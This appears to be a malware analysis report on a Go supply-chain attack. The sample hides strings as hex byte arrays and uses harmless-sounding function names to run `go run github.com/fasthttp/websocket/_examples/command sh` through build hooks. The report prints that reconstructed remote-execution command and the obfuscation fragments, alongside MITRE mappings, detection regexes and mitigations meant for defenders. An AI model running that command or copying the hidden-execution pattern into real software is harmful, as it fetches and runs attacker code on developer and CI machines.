## Executive Summary

This analysis examines a sophisticated supply chain attack vector that leverages example code repositories and dependency confusion tactics to establish persistence in target environments. The analyzed specimen demonstrates advanced obfuscation techniques commonly overlooked during code review processes.

**⚠️ WARNING: This project contains malicious code and should NOT be executed under any circumstances.**

## Threat Actor Profile

**MITRE ATT&CK Tactics:**
- **T1195.002** - Supply Chain Compromise: Compromise Software Supply Chain
- **T1027** - Obfuscated Files or Information
- **T1059.004** - Command and Scripting Interpreter: Unix Shell
- **T1105** - Ingress Tool Transfer
- **T1543** - Create or Modify System Process

## Attack Vector Analysis

### Initial Access (T1195.002)

The threat actor leverages a critical vulnerability in developer workflows: the implicit trust placed in example code and legitimate-looking repositories. This attack vector exploits:

1. **Developer Time Pressure**: Engineers often copy-paste from example repositories without thorough security review
2. **Cognitive Bias**: Legitimate dependencies (`github.com/fasthttp/websocket`) create false sense of security
3. **Repository Credibility**: Professional documentation and conventional project structure bypass suspicion

### Obfuscation Techniques (T1027)

#### Hex Encoding Obfuscation
```go
func resolveExecutor() string {
    x := byte(0x67)  // 'g'
    y := byte(0x6f)  // 'o'
    // Decodes to "go"
}
```

#### Multi-Stage Payload Decoding
The malware employs layered obfuscation:
- Primary payload: `[]byte{0x72, 0x75, 0x6e}` → "run"
- Target repository: Complex hex array decoding to `github.com/fasthttp/websocket/_examples/command`
- Shell parameter: `[]byte{0x73, 0x68}` → "sh"

#### Semantic Deception
Functions utilize legitimate-sounding names to evade detection:
- `middlewareGate()` - Appears to be middleware configuration
- `execCompatibilityCheck()` - Mimics compatibility testing
- `bridgeWorkerShim()` - Suggests internal bridging logic

### Command and Control (C2) Characteristics

**Reconstructed Command:**
```bash
go run github.com/fasthttp/websocket/_examples/command sh
```

This command represents a sophisticated C2 mechanism:
- Leverages Go's native `go run` for direct remote execution
- Targets example code repositories (often unmonitored)
- Uses shell interpreter for maximum flexibility

## Persistence Mechanisms

### Developer Environment Integration

1. **Build System Integration**: Makefile execution triggers malicious code during routine development workflows
2. **Dependency Chain Pollution**: Once integrated, spreads through internal repositories via copy-paste propagation
3. **CI/CD Pipeline Infection**: Automated build processes execute malicious code without human oversight

### Example Code as Attack Vector

Example repositories represent critical security blind spots:

**Risk Factors:**
- Minimal security scrutiny compared to production dependencies
- Frequent developer interaction and copying
- Often hosted on legitimate platforms (GitHub, GitLab)
- May persist indefinitely without maintenance

**Detection Challenges:**
- Standard dependency scanners ignore example code paths
- Static analysis tools may not analyze `go run` remote execution
- Legitimate use of `exec.Command()` in infrastructure code

## MITRE ATT&CK Mapping

| Technique | Implementation | Detection Opportunity |
|-----------|----------------|----------------------|
| T1195.002 | Malicious example repo | Repository reputation analysis |
| T1027 | Hex encoding, semantic deception | Entropy analysis, function naming patterns |
| T1059.004 | Shell command execution | Process monitoring, command line analysis |
| T1105 | Remote code download via `go run` | Network monitoring, Go module analysis |
| T1543 | Process creation via exec | EDR process tree analysis |

## Detection Strategies

### Static Analysis Indicators

1. **Hex Array Patterns**: Large byte arrays with sequential hex values
2. **Obfuscated Strings**: XOR operations or byte manipulation for string construction
3. **Suspicious Function Names**: Generic names in security-sensitive contexts
4. **External Command Execution**: `exec.Command()` with dynamic parameters

### Runtime Detection

1. **Process Monitoring**: Monitor for `go run` with remote repository arguments
2. **Network Analysis**: Outbound connections to code hosting platforms during execution
3. **File System Monitoring**: Temporary Go module downloads

### Code Review Guidelines

1. **Trust Verification**: Validate all external repositories, including examples
2. **Obfuscation Detection**: Flag hex arrays and string manipulation patterns
3. **Execution Flow Analysis**: Trace all `exec.Command()` call paths
4. **Dependency Mapping**: Document all remote code execution vectors

## Mitigation Strategies

### Organizational Controls

1. **Repository Allowlisting**: Restrict `go run` to pre-approved repositories
2. **Code Review Requirements**: Mandatory security review for external code integration
3. **Build Environment Isolation**: Containerized builds with network restrictions
4. **Dependency Scanning**: Extend scanning to include example code repositories

### Technical Controls

1. **Network Segmentation**: Restrict build environment internet access
2. **Process Monitoring**: Deploy EDR solutions on development environments
3. **Static Analysis Integration**: Implement hex pattern detection in CI/CD
4. **Go Module Proxy**: Use private module proxies for controlled dependency resolution

## Threat Intelligence

### Indicators of Compromise (IOCs)

- Repository pattern: `/.*/_examples/command$`
- Process pattern: `go run .* sh$`
- Network pattern: Outbound HTTPS to code hosting during build
- File pattern: Temporary Go modules with command execution

### Attribution Challenges

Example code attacks present significant attribution difficulties:
- Public repository hosting obscures true origin
- Legitimate infrastructure usage complicates tracking
- Time-delayed activation evades immediate detection

## Conclusion

This specimen demonstrates the evolution of supply chain attacks toward more subtle, persistent mechanisms. The abuse of example code repositories represents a critical gap in current security practices, requiring immediate attention from security teams.

The sophistication of obfuscation techniques, combined with the implicit trust placed in example code, creates a potent attack vector that traditional security controls often miss. Organizations must adapt their security practices to address this emerging threat landscape.

## Recommendations

1. **Immediate**: Audit all example code dependencies in current projects
2. **Short-term**: Implement static analysis rules for obfuscation detection
3. **Long-term**: Develop comprehensive example code security frameworks
4. **Strategic**: Engage with open-source communities on example code security standards
